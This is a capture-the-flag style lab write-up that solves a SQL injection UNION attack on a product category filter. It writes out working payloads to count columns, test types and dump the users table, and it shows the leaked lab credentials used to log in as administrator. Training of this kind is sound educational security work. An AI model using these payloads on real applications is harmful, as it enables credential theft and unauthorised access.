# Lab: SQL injection UNION attack, retrieving data from other tables

### Instructions

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

### Solution

First we can begin enumerating the number of columns by incrementally adding `NULL` values until the application does not throw an error:

```sql
/filter?category=Accessories' union select null,null--
```

The request above does not result in a server error, suggesting the query returns only 2 columns.

We can then confirm both columns are string data compatible with:

```sql
/filter?category=Accessories' union select 'a','a'--
```

which also loads correctly.

We can now begin extracting data from the `users` table, as mentioned in the instructions. 

```sql
/filter?category=Accessories' union select username,password from users--
```

Under the hood this is running something like:

```sql
SELECT category FROM products
UNION SELECT username,password FROM users
```
This returns three rows from the `users` table, each containing a username and password.

```
wiener
4nldg1eaqbp98azpfetw
administrator
s7wkv7svsr24mdtr0zqb
carlos
sk73v3tr9yp48eyht2qq
```

We can use the administrator credentials to login at `/login` and complete the lab.